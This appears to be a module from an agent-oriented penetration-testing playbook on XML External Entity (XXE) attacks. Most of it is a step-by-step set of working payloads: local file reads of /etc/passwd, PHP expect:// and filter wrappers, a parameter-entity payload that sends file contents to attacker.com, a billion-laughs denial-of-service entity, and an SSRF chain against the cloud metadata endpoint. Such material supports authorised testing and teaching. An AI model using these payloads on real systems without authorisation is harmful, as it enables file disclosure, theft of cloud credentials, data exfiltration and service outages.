# Web And API Operations: Attack Primitives: Traditional Web Vulnerabilities: XXE (XML External Entity)

> Apply [../module-continuity.md](../module-continuity.md). Keep the same engagement and parent path as the calling route. Load this scene only when current evidence supports its prerequisites.

### XXE (XML External Entity)

#### Test Every XML Parser

Anywhere XML is accepted: SOAP APIs, SAML authentication, RSS/Atom feeds, Office document processing, image metadata (SVG), PDF generation, configuration import, sitemap parsing.

**Basic testing progression**:

```xml
<!-- Step 1: Does XXE exist? (try to load external DTD) -->
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://your-server.com/xxe-test">]>
<root>&xxe;</root>

<!-- Step 2: Read local file -->
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- Step 3: If file read blocked, try alternative protocols -->
<!-- PHP: expect://id, php://filter/convert.base64-encode/resource=/etc/passwd -->
<!-- Java: jar://, netdoc:// -->

<!-- Step 4: If no outbound connection, try parameter entities + error-based -->
<!DOCTYPE test [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?%file;'>">
  %eval;
]>
<root>&exfil;</root>

<!-- Step 5: If fully blind, try billion laughs (DoS) or local DTD -->
<!DOCTYPE test [
  <!ENTITY a0 "lol">
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!-- ... exponential growth ... -->
]>
<root>&a8;</root>
```

**XXE + SSRF chain**: If external DTD loading works but file reading doesn't, use XXE for SSRF: `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">`


## Scene Exit

Return result classification, evidence, changed assumptions, affected paths, persistent changes, and the next parent-path decision.
